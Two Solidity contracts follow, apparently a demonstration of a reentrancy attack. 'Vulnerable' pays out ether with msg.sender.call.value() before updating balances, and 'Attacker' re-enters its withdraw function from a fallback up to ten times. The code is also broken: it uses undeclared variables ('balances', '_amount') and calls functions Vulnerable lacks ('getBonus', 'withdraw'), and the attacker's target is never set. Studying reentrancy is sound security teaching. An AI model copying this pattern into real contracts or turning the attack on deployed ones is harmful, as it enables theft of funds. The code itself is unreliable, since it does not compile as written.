pragma solidity ^0.4.18;

contract Vulnerable{
  mapping (address => uint) private userBalances;
  uint public totalbalance = 0;

  function deposit() payable{ 
     userBalances[msg.sender] += msg.value; 
     totalbalance += msg.value;
  } 

  // Each recipient should only be able to claim the bonus once
  function withdrawAll(address to) external {
      uint256 amount = balances[msg.sender];
      if (balances[msg.sender] > 0) {
        require(msg.sender.call.value(amount)());
        totalbalance -= _amount;
    	  balances[msg.sender] = 0;
      }
  }
  
  // withdraw part the money
  function withdrawPortion(uint _amount) external {   
     if (balances[msg.sender] >= amount) {
        require(msg.sender.call.value(amount)());
        totalbalance -= _amount;
        userBalances[msg.sender] -= amount;
     }
  }
}

pragma solidity ^0.4.18;
import './Vulnerable.sol';

contract Attacker{
  address private _owner;
  uint public count = 0;
  Vulnerable vul;

  //initial the attack contract with the vulnerable address
  function Attacker(){ 
     _owner = msg.sender;
  }

  function attack(){
    vul.getBonus(_owner);
  }

  function () payable{
     count++;
     if(count < 10){
       vul.withdraw(1 ether);
     }
  }
}

